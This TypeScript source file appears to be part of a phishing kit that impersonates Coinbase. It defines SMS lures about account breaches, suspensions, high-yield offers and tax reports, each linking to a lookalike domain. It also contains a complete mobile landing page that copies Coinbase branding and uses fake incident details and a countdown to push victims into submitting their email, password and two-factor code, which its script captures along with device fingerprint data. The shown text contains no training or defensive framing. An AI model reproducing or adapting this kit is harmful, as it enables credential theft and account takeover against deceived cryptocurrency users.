WHY THIS OFFER?
- Market-leading rates: Higher than traditional savings accounts
- Stable returns: USDC is pegged to the US dollar
- Instant liquidity: Withdraw anytime without penalties
- Secure platform: Your funds are protected by Coinbase security

🎁 BONUS OFFER
Deposit {{MINIMUM_DEPOSIT}} or more in the first 48 hours and receive an additional {{REFERRAL_BONUS}} bonus!

Start earning: {{SIGNUP_LINK}}

*Annual Percentage Yield. Rate subject to change. Terms and conditions apply.

© 2024 Coinbase, Inc. All rights reserved.
Cryptocurrency is not FDIC insured and involves risk of loss.
    `.trim();
  }

  private initializeSMSTemplates(): void {
    const templates: CoinbaseSMSTemplate[] = [
      {
        id: 'security_alert_sms',
        scenario: this.scenarios.get('security_breach_alert')!,
        message: 'COINBASE ALERT: Unauthorized access detected on your account. Secure immediately: {{LINK}} Ref: {{INCIDENT_ID}}',
        fromName: 'Coinbase',
        variables: {
          'LINK': 'https://cb-security-verify.com/secure',
          'INCIDENT_ID': 'SEC-001856'
        },
        followUpAction: 'landing_page'
      },
      {
        id: 'account_suspended_sms',
        scenario: this.scenarios.get('account_suspension_notice')!,
        message: 'Coinbase: Your account has been temporarily suspended. Complete verification within 24hrs: {{LINK}} ID: {{ACCOUNT_ID}}',
        fromName: 'Coinbase',
        variables: {
          'LINK': 'https://coinbase-verify.net/restore',
          'ACCOUNT_ID': 'CB-UK-789456'
        },
        followUpAction: 'landing_page'
      },
      {
        id: 'earn_opportunity_sms',
        scenario: this.scenarios.get('new_earn_opportunity')!,
        message: '🚀 Coinbase: Exclusive {{APY_RATE}} APY on USDC! Limited time offer expires {{DATE}}. Start earning: {{LINK}}',
        fromName: 'Coinbase',
        variables: {
          'APY_RATE': '12%',
          'DATE': 'Jan 31',
          'LINK': 'https://cb-earn.net/signup'
        },
        followUpAction: 'landing_page'
      },
      {
        id: 'tax_deadline_sms',
        scenario: this.scenarios.get('tax_reporting_requirement')!,
        message: 'Coinbase: Your {{YEAR}} tax report is ready. Download before IRS deadline {{DATE}}: {{LINK}}',
        fromName: 'Coinbase',
        variables: {
          'YEAR': '2023',
          'DATE': 'Apr 15',
          'LINK': 'https://cb-taxreport.com/download'
        },
        followUpAction: 'landing_page'
      }
    ];

    templates.forEach(template => {
      this.smsTemplates.set(template.id, template);
    });
  }

  private initializeMobileTemplates(): void {
    const templates: CoinbaseMobileTemplate[] = [
      {
        id: 'coinbase_app_security',
        scenario: this.scenarios.get('security_breach_alert')!,
        appSimulation: {
          appName: 'Coinbase: Buy Bitcoin & Crypto',
          packageName: 'com.coinbase.android',
          iconUrl: '/assets/coinbase-app-icon.png',
          screenshots: ['/assets/coinbase-mobile-1.png', '/assets/coinbase-mobile-2.png'],
          permissions: ['camera', 'location', 'biometric', 'contacts'],
          features: ['Touch ID', 'Face ID', 'Multi-factor Authentication', 'Advanced Encryption']
        },
        landingPageHtml: this.generateMobileLandingHTML(),
        formFields: [
          {
            name: 'email',
            type: 'email',
            placeholder: 'Enter your email',
            validation: 'email',
            sensitive: true
          },
          {
            name: 'password',
            type: 'password',
            placeholder: 'Enter your password',
            validation: 'required',
            sensitive: true
          },
          {
            name: 'two_factor_code',
            type: 'text',
            placeholder: '6-digit code',
            validation: 'numeric',
            sensitive: true
          },
          {
            name: 'phone_number',
            type: 'tel',
            placeholder: '+1 (555) 123-4567',
            validation: 'phone',
            sensitive: true
          }
        ]
      }
    ];

    templates.forEach(template => {
      this.mobileTemplates.set(template.id, template);
    });
  }

  private generateMobileLandingHTML(): string {
    return `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>Coinbase</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        
        * { 
            box-sizing: border-box; 
            margin: 0; 
            padding: 0; 
            -webkit-tap-highlight-color: transparent;
        }
        
        body { 
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background-color: #ffffff;
            color: #0a0b0d;
            line-height: 1.5;
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .mobile-container {
            min-height: 100vh;
            background: #ffffff;
            position: relative;
        }
        
        .mobile-header {
            background: #ffffff;
            padding: 20px 20px 16px;
            border-bottom: 1px solid #f2f2f7;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .mobile-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .mobile-logo {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .mobile-logo-icon {
            width: 28px;
            height: 28px;
            background: #0052ff;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: 700;
            font-size: 16px;
        }
        
        .mobile-logo-text {
            font-size: 20px;
            font-weight: 600;
            color: #0a0b0d;
        }
        
        .mobile-close {
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: none;
            border: none;
            font-size: 20px;
            color: #8b8b8b;
            cursor: pointer;
        }
        
        .mobile-title {
            font-size: 24px;
            font-weight: 600;
            color: #0a0b0d;
            text-align: center;
            margin-bottom: 8px;
        }
        
        .mobile-subtitle {
            font-size: 16px;
            color: #666;
            text-align: center;
        }
        
        .security-banner {
            background: linear-gradient(135deg, #ff6b35, #ff8c42);
            margin: 0 20px 24px;
            padding: 16px;
            border-radius: 12px;
            text-align: center;
        }
        
        .security-banner-icon {
            font-size: 32px;
            margin-bottom: 8px;
        }
        
        .security-banner-title {
            color: white;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 4px;
        }
        
        .security-banner-subtitle {
            color: rgba(255, 255, 255, 0.9);
            font-size: 14px;
        }
        
        .mobile-content {
            padding: 0 20px 32px;
        }
        
        .incident-card {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
        }
        
        .incident-card h4 {
            color: #0a0b0d;
            font-weight: 600;
            font-size: 16px;
            margin-bottom: 12px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .incident-list {
            list-style: none;
            padding: 0;
        }
        
        .incident-list li {
            color: #666;
            font-size: 14px;
            margin-bottom: 8px;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
        }
        
        .incident-list strong {
            color: #0a0b0d;
            margin-right: 8px;
            flex-shrink: 0;
        }
        
        .incident-value {
            text-align: right;
            flex: 1;
        }
        
        .mobile-form {
            space-y: 20px;
        }
        
        .mobile-form-group {
            margin-bottom: 20px;
        }
        
        .mobile-form-label {
            display: block;
            font-size: 16px;
            font-weight: 500;
            color: #0a0b0d;
            margin-bottom: 8px;
        }
        
        .mobile-form-input {
            width: 100%;
            height: 52px;
            padding: 16px;
            border: 1px solid #d2d2d7;
            border-radius: 12px;
            font-size: 16px;
            background: #ffffff;
            transition: all 0.2s ease;
            -webkit-appearance: none;
            appearance: none;
        }
        
        .mobile-form-input:focus {
            outline: none;
            border-color: #0052ff;
            box-shadow: 0 0 0 3px rgba(0, 82, 255, 0.1);
        }
        
        .mobile-form-input::placeholder {
            color: #8b8b8b;
        }
        
        .mobile-submit-btn {
            width: 100%;
            height: 52px;
            background: #0052ff;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s ease;
            margin: 24px 0;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }
        
        .mobile-submit-btn:active {
            background: #0041cc;
            transform: scale(0.98);
        }
        
        .mobile-submit-btn:disabled {
            background: #8b8b8b;
            cursor: not-allowed;
            transform: none;
        }
        
        .security-features {
            background: #f8f9fa;
            border-radius: 12px;
            padding: 16px;
            margin-top: 24px;
        }
        
        .security-features h4 {
            color: #0a0b0d;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 12px;
            text-align: center;
        }
        
        .security-features-list {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
            list-style: none;
            padding: 0;
        }
        
        .security-features-list li {
            color: #666;
            font-size: 12px;
            display: flex;
            align-items: center;
            gap: 6px;
        }
        
        .countdown-timer {
            background: linear-gradient(135deg, #fff3cd, #ffeaa7);
            border: 1px solid #ffeaa7;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 24px;
            text-align: center;
        }
        
        .countdown-timer-title {
            color: #856404;
            font-weight: 600;
            font-size: 14px;
            margin-bottom: 4px;
        }
        
        .countdown-timer-value {
            color: #856404;
            font-weight: 700;
            font-size: 18px;
            font-family: 'SF Mono', Monaco, monospace;
        }
        
        .biometric-prompt {
            background: #e3f2fd;
            border: 1px solid #bbdefb;
            border-radius: 12px;
            padding: 20px;
            margin: 24px 0;
            text-align: center;
        }
        
        .biometric-icon {
            width: 60px;
            height: 60px;
            background: #2196f3;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            color: white;
            font-size: 24px;
        }
        
        .biometric-text {
            color: #1976d2;
            font-size: 14px;
            line-height: 1.4;
        }
        
        @media (max-width: 375px) {
            .mobile-header { padding: 16px 16px 12px; }
            .mobile-content { padding: 0 16px 24px; }
            .security-banner { margin: 0 16px 20px; }
        }
        
        @supports (-webkit-touch-callout: none) {
            .mobile-form-input {
                font-size: 16px; /* Prevent zoom on iOS */
            }
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <header class="mobile-header">
            <nav class="mobile-nav">
                <div class="mobile-logo">
                    <div class="mobile-logo-icon">C</div>
                    <span class="mobile-logo-text">Coinbase</span>
                </div>
                <button class="mobile-close">✕</button>
            </nav>
            
            <h1 class="mobile-title">Security Verification</h1>
            <p class="mobile-subtitle">Verify your identity to continue</p>
        </header>
        
        <div class="security-banner">
            <div class="security-banner-icon">🛡️</div>
            <div class="security-banner-title">Account Protection Active</div>
            <div class="security-banner-subtitle">Unusual activity detected on your account</div>
        </div>
        
        <div class="mobile-content">
            <div class="countdown-timer">
                <div class="countdown-timer-title">Verification expires in</div>
                <div class="countdown-timer-value" id="countdown">23:45:12</div>
            </div>
            
            <div class="incident-card">
                <h4>🔍 Incident Details</h4>
                <ul class="incident-list">
                    <li>
                        <strong>ID:</strong>
                        <span class="incident-value">SEC-2024-001856</span>
                    </li>
                    <li>
                        <strong>Time:</strong>
                        <span class="incident-value">Today, 2:23 PM</span>
                    </li>
                    <li>
                        <strong>Location:</strong>
                        <span class="incident-value">Unknown (VPN)</span>
                    </li>
                    <li>
                        <strong>Device:</strong>
                        <span class="incident-value">Mobile (Unknown)</span>
                    </li>
                </ul>
            </div>
            
            <form id="mobileSecurityForm" class="mobile-form">
                <div class="mobile-form-group">
                    <label for="mobile-email" class="mobile-form-label">Email</label>
                    <input 
                        type="email" 
                        id="mobile-email" 
                        name="email" 
                        class="mobile-form-input"
                        placeholder="Enter your email"
                        autocomplete="email"
                        required
                    >
                </div>
                
                <div class="mobile-form-group">
                    <label for="mobile-password" class="mobile-form-label">Password</label>
                    <input 
                        type="password" 
                        id="mobile-password" 
                        name="password" 
                        class="mobile-form-input"
                        placeholder="Enter your password"
                        autocomplete="current-password"
                        required
                    >
                </div>
                
                <div class="mobile-form-group">
                    <label for="mobile-2fa" class="mobile-form-label">2-Factor Authentication</label>
                    <input 
                        type="text" 
                        id="mobile-2fa" 
                        name="two_factor_code" 
                        class="mobile-form-input"
                        placeholder="000000"
                        maxlength="6"
                        pattern="[0-9]{6}"
                        inputmode="numeric"
                        required
                    >
                </div>
                
                <button type="submit" class="mobile-submit-btn">
                    <span>🔐</span>
                    <span>Verify & Secure Account</span>
                </button>
            </form>
            
            <div class="biometric-prompt">
                <div class="biometric-icon">👤</div>
                <div class="biometric-text">
                    Touch ID or Face ID may be required for additional verification
                </div>
            </div>
            
            <div class="security-features">
                <h4>🔒 Your Security is Protected</h4>
                <ul class="security-features-list">
                    <li>🛡️ Bank-level encryption</li>
                    <li>🏦 FDIC insured</li>
                    <li>🔐 2FA protected</li>
                    <li>📱 Biometric security</li>
                </ul>
            </div>
        </div>
    </div>
    
    <script>
        // Mobile behavior tracking
        let touchEvents = 0;
        let orientationChanges = 0;
        let formStartTime = Date.now();
        let deviceMotionEvents = 0;
        
        // Track mobile interactions
        document.addEventListener('touchstart', () => touchEvents++);
        document.addEventListener('touchmove', () => touchEvents++);
        window.addEventListener('orientationchange', () => orientationChanges++);
        
        // Track device motion (if available)
        if (window.DeviceMotionEvent) {
            window.addEventListener('devicemotion', () => deviceMotionEvents++);
        }
        
        // Form submission
        document.getElementById('mobileSecurityForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = this.querySelector('.mobile-submit-btn');
            const formData = new FormData(this);
            
            // Show loading state
            submitBtn.innerHTML = '<span>🔄</span><span>Verifying...</span>';
            submitBtn.disabled = true;
            
            // Collect behavioral data
            const behaviorData = {
                touchEvents,
                orientationChanges,
                deviceMotionEvents,
                formCompletionTime: (Date.now() - formStartTime) / 1000,
                screenSize: \`\${window.screen.width}x\${window.screen.height}\`,
                devicePixelRatio: window.devicePixelRatio,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
            
            // Store captured data
            console.log('Mobile Security Form Data:', {
                email: formData.get('email'),
                password: formData.get('password'),
                twoFactorCode: formData.get('two_factor_code'),
                behaviorMetrics: behaviorData
            });
            
            // Simulate verification process
            setTimeout(() => {
                // Show biometric prompt
                showBiometricPrompt();
            }, 2000);
        });
        
        function showBiometricPrompt() {
            const biometricPrompt = document.querySelector('.biometric-prompt');
            biometricPrompt.style.background = '#e8f5e8';
            biometricPrompt.style.borderColor = '#4caf50';
            biometricPrompt.querySelector('.biometric-icon').style.background = '#4caf50';
            biometricPrompt.querySelector('.biometric-icon').textContent = '✓';
            biometricPrompt.querySelector('.biometric-text').textContent = 'Biometric verification successful';
            biometricPrompt.querySelector('.biometric-text').style.color = '#2e7d32';
            
            setTimeout(() => {
                window.location.href = '/mobile-verification-complete';
            }, 1500);
        }
        
        // Countdown timer
        let timeLeft = 23 * 3600 + 45 * 60 + 12;
        
        function updateCountdown() {
            const hours = Math.floor(timeLeft / 3600);
            const minutes = Math.floor((timeLeft % 3600) / 60);
            const seconds = timeLeft % 60;
            
            const display = \`\${hours.toString().padStart(2, '0')}:\${minutes.toString().padStart(2, '0')}:\${seconds.toString().padStart(2, '0')}\`;
            document.getElementById('countdown').textContent = display;
            
            timeLeft--;
            if (timeLeft < 0) {
                const countdownEl = document.querySelector('.countdown-timer');
                countdownEl.style.background = 'linear-gradient(135deg, #ffebee, #ffcdd2)';
                countdownEl.style.borderColor = '#f44336';
                document.querySelector('.countdown-timer-title').textContent = 'Verification expired';
                document.querySelector('.countdown-timer-title').style.color = '#c62828';
                document.getElementById('countdown').textContent = '00:00:00';
                document.getElementById('countdown').style.color = '#c62828';
            }
        }
        
        setInterval(updateCountdown, 1000);
        
        // Prevent zoom on input focus (iOS)
        document.addEventListener('touchstart', function() {}, true);
        
        // Handle viewport changes
        function handleViewportChange() {
            const vh = window.innerHeight * 0.01;
            document.documentElement.style.setProperty('--vh', \`\${vh}px\`);
        }
        
        window.addEventListener('resize', handleViewportChange);
        handleViewportChange();
    </script>
</body>
</html>`;
  }

  // Public API methods
  getEmailTemplates(): CoinbaseEmailTemplate[] {
    return Array.from(this.emailTemplates.values());
  }

  getSMSTemplates(): CoinbaseSMSTemplate[] {
    return Array.from(this.smsTemplates.values());
  }

  getMobileTemplates(): CoinbaseMobileTemplate[] {
    return Array.from(this.mobileTemplates.values());
  }

  getScenarios(): CoinbaseScenario[] {
    return Array.from(this.scenarios.values());
  }

  getEmailTemplate(id: string): CoinbaseEmailTemplate | undefined {
    return this.emailTemplates.get(id);
  }

  getSMSTemplate(id: string): CoinbaseSMSTemplate | undefined {
    return this.smsTemplates.get(id);
  }

  getMobileTemplate(id: string): CoinbaseMobileTemplate | undefined {
    return this.mobileTemplates.get(id);
  }

  renderEmailTemplate(templateId: string, variables: { [key: string]: string }): CoinbaseEmailTemplate | null {
    const template = this.emailTemplates.get(templateId);
    if (!template) return null;

    const rendered = { ...template };

    // Replace variables in subject
    rendered.subject = this.replaceVariables(template.subject, { ...template.variables, ...variables });

    // Replace variables in HTML content
    rendered.htmlContent = this.replaceVariables(template.htmlContent, { ...template.variables, ...variables });

    // Replace variables in text content
    rendered.textContent = this.replaceVariables(template.textContent, { ...template.variables, ...variables });

    return rendered;
  }

  renderSMSTemplate(templateId: string, variables: { [key: string]: string }): CoinbaseSMSTemplate | null {
    const template = this.smsTemplates.get(templateId);
    if (!template) return null;

    const rendered = { ...template };
    rendered.message = this.replaceVariables(template.message, { ...template.variables, ...variables });

    return rendered;
  }

  private replaceVariables(content: string, variables: { [key: string]: string }): string {
    let result = content;
    Object.entries(variables).forEach(([key, value]) => {
      const regex = new RegExp(`\\{\\{${key}\\}\\}`, 'g');
      result = result.replace(regex, value);
    });
    return result;
  }

  getTemplatesByScenario(scenarioId: string): {
    email: CoinbaseEmailTemplate[];
    sms: CoinbaseSMSTemplate[];
    mobile: CoinbaseMobileTemplate[];
  } {
    return {
      email: Array.from(this.emailTemplates.values()).filter(t => t.scenario.id === scenarioId),
      sms: Array.from(this.smsTemplates.values()).filter(t => t.scenario.id === scenarioId),
      mobile: Array.from(this.mobileTemplates.values()).filter(t => t.scenario.id === scenarioId)
    };
  }

  getTemplatesByUrgency(urgencyLevel: number): {
    email: CoinbaseEmailTemplate[];
    sms: CoinbaseSMSTemplate[];
    mobile: CoinbaseMobileTemplate[];
  } {
    return {
      email: Array.from(this.emailTemplates.values()).filter(t => t.scenario.urgencyLevel >= urgencyLevel),
      sms: Array.from(this.smsTemplates.values()).filter(t => t.scenario.urgencyLevel >= urgencyLevel),
      mobile: Array.from(this.mobileTemplates.values()).filter(t => t.scenario.urgencyLevel >= urgencyLevel)
    };
  }

  getTemplatesByAudience(audience: string): {
    email: CoinbaseEmailTemplate[];
    sms: CoinbaseSMSTemplate[];
    mobile: CoinbaseMobileTemplate[];
  } {
    return {
      email: Array.from(this.emailTemplates.values()).filter(t => t.scenario.targetAudience === audience || t.scenario.targetAudience === 'general'),
      sms: Array.from(this.smsTemplates.values()).filter(t => t.scenario.targetAudience === audience || t.scenario.targetAudience === 'general'),
      mobile: Array.from(this.mobileTemplates.values()).filter(t => t.scenario.targetAudience === audience || t.scenario.targetAudience === 'general')
    };
  }
}

export const coinbaseTemplateService = new CoinbaseTemplateService();